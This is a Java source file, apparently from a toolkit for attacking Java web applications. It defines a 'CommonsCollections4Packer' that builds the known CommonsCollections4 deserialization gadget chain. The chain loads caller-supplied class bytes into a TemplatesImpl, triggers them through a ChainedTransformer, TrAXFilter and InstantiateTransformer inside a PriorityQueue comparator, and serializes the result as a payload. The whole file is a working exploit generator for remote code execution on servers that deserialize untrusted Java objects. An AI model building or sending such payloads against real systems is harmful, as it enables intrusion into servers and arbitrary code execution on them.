package com.reajason.javaweb.packer.deserialize.java;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.deserialize.JavaDeserializeGenerator;
import com.reajason.javaweb.packer.deserialize.TemplateUtils;
import com.reajason.javaweb.packer.deserialize.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import lombok.SneakyThrows;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;


/**
 * @author ReaJason
 * @since 2025/2/17
 */
public class CommonsCollections4Packer implements Packer {

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        TemplatesImpl templates = TemplateUtils.createTemplatesImpl(config.getClassBytes());
        ChainedTransformer chain =
                new ChainedTransformer(
                        new ConstantTransformer(TrAXFilter.class),
                        new InstantiateTransformer(
                                new Class[]{Templates.class}, new Object[]{templates}));
        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        Reflections.setFieldValue(queue, "size", 2);
        Reflections.setFieldValue(queue, "comparator", comparator);
        return JavaDeserializeGenerator.generate(queue);
    }
}
